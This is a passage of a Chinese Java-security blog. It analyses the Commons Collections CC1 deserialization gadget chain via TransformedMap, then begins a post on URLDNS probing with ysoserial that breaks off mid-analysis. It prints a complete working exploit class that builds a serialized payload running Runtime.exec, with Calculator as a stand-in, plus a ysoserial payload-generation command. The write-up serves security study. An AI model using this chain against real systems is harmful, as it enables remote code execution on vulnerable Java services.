<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var1.defaultReadObject();</span><br><span class="line"><span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line"><span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">  Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">  <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">  <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">  <span class="comment">// 注意看这里，这里还有一个判断，如果var7为null，那么我们就无法进入到setValue，也就无法触发transform()。</span></span><br><span class="line">  <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">    var5.setValue(......);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么来分析一下这个var7是哪里来的</p>
<ol>
<li><p>var7 是通过<code>var3.get(var6)</code>获得</p>
</li>
<li><p>var3 为<code>var2.memberTypes();</code></p>
</li>
<li><p>var2 为<code>AnnotationType.getInstance(this.type); </code>这里的this.type实际上就是前边构造函数赋值的那个<code>Retention.class</code>。然后得到一个AnnotationType</p>
</li>
<li><p>往回推，看<code>var2.memberTypes();</code>得到的结果是一个map并且赋值给了var3</p>
</li>
<li><p>来看一下var3这个map里存的是什么值，其实就是一个键值对<code>&#123;value=class java.lang.annotation.RetentionPolicy&#125;</code>，键是<code>value</code>，值是<code>class java.lang.annotation.RetentionPolicy</code></p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AnnotationType</span> <span class="variable">instance</span> <span class="operator">=</span> AnnotationType.getInstance(Retention.class);</span><br><span class="line">System.out.println(instance.memberTypes());</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112922215.png" alt="图片"></p>
<ol start="6">
<li><p>再回来看var7，var7是从var3.get(var6)中获得到的，并且随后进行了<code>var7 != null</code>的判断，那么这里var3我们已经知道他里边存储的键值对是<code>&#123;value=class java.lang.annotation.RetentionPolicy&#125;</code>，所以这里只需要能让<code>var3.get(&quot;value&quot;)</code>达到这样的效果，那么var7就不会为null。</p>
</li>
<li><p>那么var3.get()又是根据var6来的，看下边分析。</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 而var4这个迭代器其实就是this.memberValues，而this.memberValues其实就是TransformedMap。</span></span><br><span class="line"><span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">  <span class="comment">// var5呢就是var4这个迭代器输出的一个键值对包装类Map.Entry</span></span><br><span class="line">  Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">  <span class="comment">// var6实际上就是var5这个键值对里的键</span></span><br><span class="line">  <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>所以我们只需要在TransformedMap里存一个键值对为<code>value=xxx</code>的，就可以让<code>var7 != null</code>成立。从而进入执行setValue的代码</li>
</ol>
<h1 id="完整的Exp"><a href="#完整的Exp" class="headerlink" title="完整的Exp"></a>完整的Exp</h1><p>通过上边的分析后，我们只需要将所有的利用给串起来，最后生成AnnotationInvocationHandler的序列化数据即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">  )</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过反射创建AnnotationInvocationHandler</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">exp</span> <span class="operator">=</span> declaredConstructor.newInstance(Retention.class, transformedMap);</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(exp);</span><br><span class="line">oos.close();</span><br></pre></td></tr></table></figure>

<p>但是当我们运行后就会发现报错了，这个是因为将对象序列化时需要序列化的对象是必须要实现Serializable接口的，而Runtime这个类它并没有实现这个接口。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021113018711.png" alt="图片"></p>
<p>那么解决这个问题的办法呢就是将前边的Transformer改造为使用反射的方式进行获取Runtime这个对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是通过反射获取Runtime</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>);</span><br><span class="line">runtime.exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 改造成对应的Transformer</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">  ),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">  ),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">  )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>最后完整的生成代码如下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1TransformedMap</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotationInvocationHandlerClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerDeclaredConstructor</span> <span class="operator">=</span> annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">exp</span> <span class="operator">=</span> annotationInvocationHandlerDeclaredConstructor.newInstance(Retention.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(exp);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021113056695.png" alt="图片"></p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>Jdk在8u71以后修改了sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数导致在高版本Java中不可用。</p>
<p>致谢</p>
<p>本文的代码和分析过程均参考p牛的《Java安全名漫谈》实现: <a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings%EF%BC%8C%E9%9D%9E%E5%B8%B8%E6%84%9F%E8%B0%A2%EF%BC%81">https://github.com/phith0n/JavaThings，非常感谢！</a></p>

      
	</div>

<div class="meta">
	
</div>
</article>

  <article class="post">
	<h2 class="title">
		<a href="2022/10/09/Java安全-URLDNS反序列探测/">Java安全-URLDNS反序列探测</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-10-09T14:03:21.000Z" itemprop="datePublished">2022-03-9</time>
</div>
      <div class="tags">标签: 

<a href="/tags/Java安全/">Java安全</a>
</div>
    </div>
      
        <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>URLDNS常用于探测目标是否存在反序列化，本篇结合ysoserial工具分析探测的原理。</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>借助ysoserial工具可以生成对应的payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar URLDNS <span class="string">&quot;dnslog-url&quot;</span> &gt; /tmp/urldns.bin</span><br></pre></td></tr></table></figure>

<p>下边是模拟存在反序列化问题的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/tmp/urldns.bin&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure>

<p>当目标服务器读取序列化的流并调用readObject进行对象还原，那么就将触发DNSLog的回显，由此可以来判断目标是否可能存在反序列化漏洞。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640.png" alt="图片"></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>这里我们来看一下ysoserial工具的实现代码</p>
<p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/2874a69f6127fd3b3f078461741910423a6b1376/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/2874a69f6127fd3b3f078461741910423a6b1376/src/main/java/ysoserial/payloads/URLDNS.java</a></p>
<p>从源码中可以看到，最终序列化的是一个ht实例也就是HashMap，并且这个HashMap中put了一个元素为u，u的话这里是URL的类实例。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009214841252.png" alt="图片"></p>
<p>那么我们根据上边的已知道的信息，我们来看一下HashMap的readObject函数，因为在URLDNS这个payload里序列化出来的类型是HashMap，在反序列化时调用的readObject就是HashMap的readObject。</p>
<p>这里我把readObject一些代码删除了，并在注释里写了一些代码的解释。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">  <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 上边有一堆代码，主要是做一些初始化和计算字段之类的。</span></span><br><span class="line">  ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里只要你有往map里put元素，mappings就不会为0。</span></span><br><span class="line">    <span class="comment">// mappings就相当于映射的键值对表</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// use defaults</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 一些计算</span></span><br><span class="line">      ......</span><br><span class="line"></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">      <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">      Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">      table = tab;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 遍历map的键值对</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">        <span class="comment">// 注意这里这个hash(key)</span></span><br><span class="line">        putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们把这个 <code>hash(key)</code>暂开来说，这个key是什么呢，举个例子: <code>map.put(&quot;a&quot;,123);</code>，那么这个key就是 <code>a</code>。所以我们这里结合上下文，ysoserial在put时是URL的一个实例也就是u。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009215025366.png" alt="图片"></p>
<p>然后我们再跟进<code>hash()</code>这个函数，hash里就判断key是否为空，不为空的话又调用了key的<code>hashCode()</code>，那么此时我们知道key实际上就是URL这个类型，那么我们继续跟进到URL这个类看看他的hashCode是如何实现的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">      <span class="type">int</span> h;</span><br><span class="line">      <span class="comment">// 三元运算符，key为null时返回0，不为null时调用key的hashCode函数。</span></span><br><span class="line">      <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进到URL的hashCode函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line">      // hashCode 不等于 -1 就直接返回hashCode</span><br><span class="line">      if (hashCode != -1)</span><br><span class="line">          return hashCode;</span><br><span class="line">      </span><br><span class="line">      // 否则就调用handler的hashCode函数</span><br><span class="line">      // 这里的this其实就是上一段代码中的key，也就是URL这个类的实例本身。</span><br><span class="line">      hashCode = handler.hashCode(this);</span><br><span class="line">      return hashCode;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>那么这里又多了一个handler，我们在URL这个类的上下文找一下这个handler是什么。可以看到handler是一个URLStreamHandler的类型，因为上边调用了handler的hashCode函数，所以我们这里继续跟进到hashCode里。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009214841218.png" alt="图片"></p>
<p>可以看到在URLStreamHandler的hashCode函数里有接收一个参数URL，这个URL我在前边的代码注释中解释过了，他就是最开始HashMap那里put的那个URL实例也就是<code>u</code>。接着我们看到将u传给了函数<code>getHostAddress</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009214841199.png" alt="图片"></p>
<p>继续跟进看一下getHostAddress函数的逻辑，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里调用另外一个函数，继续跟进。</span></span><br><span class="line"><span class="keyword">protected</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> u.getHostAddress();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里又跳回到了java.net.URL这个类的getHostAddress。这里这个host是什么呢，其实这里大家可以自己创建一个URL实例，然后调用一下URL的getHostAddress函数，就能知道是什么了。</p>
